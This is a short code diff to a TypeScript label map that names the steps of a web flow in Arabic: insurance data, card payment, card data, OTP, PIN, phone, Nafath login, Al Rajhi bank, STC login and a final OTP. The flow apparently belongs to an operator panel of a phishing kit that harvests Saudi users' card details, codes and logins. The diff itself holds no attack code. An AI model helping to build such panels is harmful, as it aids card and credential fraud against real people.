@@ -47,27 +47,40 @@ const getPageName = (step: number | string): string => {
   // Handle string values first (legacy system)
   if (typeof step === "string") {
     const stringPageNames: Record<string, string> = {
+      // Home
+      home: "الرئيسية",
+      "home-new": "الرئيسية",
+      // Insurance
+      insur: "بيانات التأمين",
+      // Offers
+      compar: "مقارنة العروض",
+      // Payment / card
+      payment: "الدفع (بطاقة)",
+      check: "الدفع",
       _st1: "الدفع (بطاقة)",
+      _t1: "بيانات البطاقة",
+      // OTP
+      otp: "OTP",
       _t2: "OTP",
+      step2: "OTP",
+      veri: "رمز تحقق",
+      // PIN
+      pin: "PIN",
       _t3: "PIN",
+      confi: "PIN",
+      // Phone
+      phone: "الهاتف",
+      // Nafad
+      nafad: "نفاذ",
       _t6: "نفاذ",
       step4: "نفاذ",
-      phone: "الهاتف",
-      home: "الرئيسية",
-      compar: "مقارنة العروض",
-      check: "الدفع",
-      payment: "الدفع (بطاقة)",
-      veri: "رمز تحقق",
-      otp: "OTP",
-
-      step2: "OTP",
-      "home-new": "الرئيسية",
-      confi: "PIN",
-      pin: "PIN",
-      nafad: "نفاذ",
-      rajhi: "OTP الاخير",
-      "stc-login": "الاخير OTP",
-      finalOtp: "Final OTP",
+      nafad_modal: "نافذة نفاذ",
+      // Final OTP
+      finalOtp: "OTP الأخير",
+      // Rajhi
+      rajhi: "راجحي",
+      // STC
+      "stc-login": "دخول STC",
     };
     return stringPageNames[step] || `غير محدد (${step})`;
   }
